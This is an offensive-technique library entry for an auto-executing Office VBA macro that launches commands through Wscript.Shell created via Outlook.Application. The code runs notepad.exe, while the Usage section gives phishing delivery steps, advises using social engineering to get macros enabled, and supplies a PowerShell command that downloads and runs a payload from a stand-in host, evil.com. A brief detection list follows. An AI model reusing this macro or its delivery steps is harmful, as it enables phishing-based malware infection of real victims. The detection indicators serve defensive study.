---
id: 325004c3-07ec-4119-a8b3-6169fdbba458
type: code
language: VBA
verified: true
created_at: '2023-04-06T03:56:23.474971+00:00'
updated_at: '2023-04-10T20:36:50.439372+00:00'
platforms:
  - Windows
tags:
  - office-macro
  - vba-execution
  - wscript-shell
validated: true
---

# VBA-Macro-Open-Notepad-via-Wscript

## Code

```vba
Sub parent_change()
    Dim objOL
    Set objOL = CreateObject("Outlook.Application")
    Set shellObj = objOL.CreateObject("Wscript.Shell")
    shellObj.Run("notepad.exe")
End Sub
Sub AutoOpen()
    parent_change
End Sub
Sub Auto_Open()
    parent_change
End Sub
```

## Description

This VBA macro uses an intermediary Outlook.Application object to create a Wscript.Shell instance, which then executes notepad.exe. The AutoOpen and Auto_Open subroutines ensure automatic execution when the Office document is opened, making it suitable for phishing-delivered payloads that evade basic macro scans by mimicking legitimate Office scripting.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "notepad.exe" | The executable command to run via Wscript.Shell.Run | "cmd.exe /c malicious_script.bat" |

## Usage

Embed this code into a VBA module in an Excel or Word document via the VBA editor (Alt+F11). Save the document as .xlsm or .docm to preserve macros. Deliver via email attachment and rely on social engineering to get the victim to enable macros. Modify the Run command to execute payloads like PowerShell scripts (e.g., shellObj.Run "powershell -c Invoke-WebRequest -Uri evil.com/payload.ps1 -OutFile temp.ps1; temp.ps1").

## Detection

- Enable Office macro logging to capture VBA execution events.
- Monitor for winword.exe or excel.exe spawning wscript.exe or cmd.exe in process trees.
- Use EDR tools to flag anomalous COM object creations (Outlook.Application from non-Outlook processes).
- Scan documents for suspicious strings like "Wscript.Shell" or auto-execution subs using antivirus with macro analysis.

## Related

- [[procedures/Office-VBA-Wscript-Execution]]
